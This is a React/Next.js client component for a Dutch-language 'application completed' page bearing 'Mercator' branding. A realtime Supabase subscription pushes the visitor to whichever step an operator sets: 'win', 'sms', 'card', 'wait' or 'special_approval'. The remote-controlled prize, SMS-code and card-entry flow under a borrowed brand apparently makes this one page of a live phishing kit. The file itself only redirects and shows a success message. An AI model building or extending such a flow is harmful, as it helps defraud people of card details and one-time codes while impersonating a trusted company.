"use client";

import { useEffect, useState } from "react";
import { usePathname, useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import type { SessionStep } from "@/types/session";
import { MercatorStage, MercatorCard, MercatorLogoMark } from "@/components/ui/MercatorScreen";

type Props = {
  sessionId?: string;
};

export function CongratulationsClient({ sessionId = "" }: Props) {
  const router = useRouter();
  const pathname = usePathname();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cached = localStorage.getItem("activeSessionId");
      if (cached) setEffectiveSessionId(cached);
    } catch {
      /* ignore */
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    const allowedSteps: SessionStep[] = ["win", "sms", "card", "wait", "congrats", "special_approval"];

    const applyStep = (nextStep?: SessionStep) => {
      if (!nextStep) return;
      if (!allowedSteps.includes(nextStep)) return;
      if (nextStep === "congrats" && pathname.startsWith("/congratulations")) return;
      router.push(stepToPath(nextStep, effectiveSessionId));
    };

    const channel = supabase
      .channel(`congrats-session:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { current_step?: SessionStep };
          applyStep(next.current_step);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, pathname, router]);

  return (
    <MercatorStage>
      <MercatorCard className="max-w-[560px] text-center">
        {/* Confetti dots */}
        <div className="pointer-events-none absolute inset-0 opacity-60">
          <div className="absolute left-[12%] top-[16%] h-2 w-2 rounded-full bg-[#FFD700]/70" />
          <div className="absolute left-[24%] top-[10%] h-2.5 w-2.5 rounded-full bg-[#7fd4ff]/80" />
          <div className="absolute right-[22%] top-[14%] h-2 w-2 rounded-full bg-[#FFD700]/80" />
          <div className="absolute right-[10%] top-[24%] h-2.5 w-2.5 rounded-full bg-[#00A9E0]/80" />
        </div>

        <div className="relative mb-6 flex justify-center">
          <MercatorLogoMark />
        </div>

        <div className="relative mx-auto mb-6 flex h-20 w-20 items-center justify-center">
          <div className="absolute inset-0 animate-ping rounded-full bg-[#00A9E0]/20" style={{ animationDuration: "2.4s" }} />
          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-gradient-to-br from-[#00A9E0] to-[#00257E] shadow-[0_0_40px_rgba(0,169,224,0.55)]">
            <svg
              aria-hidden
              viewBox="0 0 24 24"
              className="h-10 w-10 text-white"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M20 6 9 17l-5-5" />
            </svg>
          </div>
        </div>

        <h2 className="text-2xl font-extrabold tracking-tight text-white sm:text-3xl">
          Aanvraag voltooid
        </h2>
        <p className="relative mt-3 text-base font-medium leading-relaxed text-white/60">
          Proficiat! Uw aanvraag is succesvol afgerond. Volg de verdere instructies van de partner.
        </p>
      </MercatorCard>
    </MercatorStage>
  );
}
